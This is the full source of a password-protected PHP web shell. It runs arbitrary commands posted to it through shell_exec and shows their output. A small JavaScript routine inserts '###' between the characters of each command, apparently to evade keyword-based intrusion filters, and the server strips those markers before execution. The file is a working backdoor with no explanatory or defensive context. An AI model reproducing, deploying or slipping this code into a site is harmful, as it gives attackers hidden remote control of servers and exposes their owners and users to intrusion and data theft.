<?php
    @session_start();

    $password = "b50e8f7a6b32b8a37d090dc146e47b47"; # plain text => hash(md5)
    $input_password = $_POST["password"];
    $page = $_SERVER["PHP_SELF"];
    $cmd = $_POST["cmd"];

    if(empty($_SESSION["webshell_id"]) && empty($input_password)) {
        # password input form print
        ?>
        <form action="<?=$page?>" method="POST">
        <input type="password" name="password">
        <input type="submit" value="AUTH">
        </form>
        <?
        exit();
    } else if(empty($_SESSION["webshell_id"]) && !empty($input_password)) {
        if($password == md5($input_password)) {
            # Login Success!
            $_SESSION["webshell_id"] = "minhyuk";
            echo "<script>location.href='{$page}'</script>";
            exit();
        } else {
            echo "<script>location.href='{$page}'</script>";
            exit();
        }
    }

    if(!empty($cmd)) {
        $cmd = str_replace("###", "", $cmd);
        $result = shell_exec($cmd);
        $reuslt = str_replace("\n", "<br>", $result);
    }
?>
<script>
    document.addEventListener("keydown", (event)=>{if(event.keyCode === 13){cmdRequest()}});
    function cmdRequest() {
        var frm = document.frm;
        var cmd = frm.cmd.value;
        var enc_cmd = "";

        for(i=0; i<cmd.length; i++) {
            enc_cmd += cmd.charAt(i) + "###";
        }
        frm.cmd.value = enc_cmd;
        frm.action = "<?=$page?>";
        frm.submit();
    }
</script>
<form name="frm" method="POST">
<input type="text" name="cmd" value="<?=$cmd?>">
<input type="button" onClick="cmdRequest()" value="EXECUTE">
</form>
<hr>
<? if (!empty($cmd)) { ?>
<table style="border: 1px solid black; background-color: black;">
<tr>
    <td style="color: white; font-size: 12px"><?=$result?></td>
</tr>
</table>
<? } ?>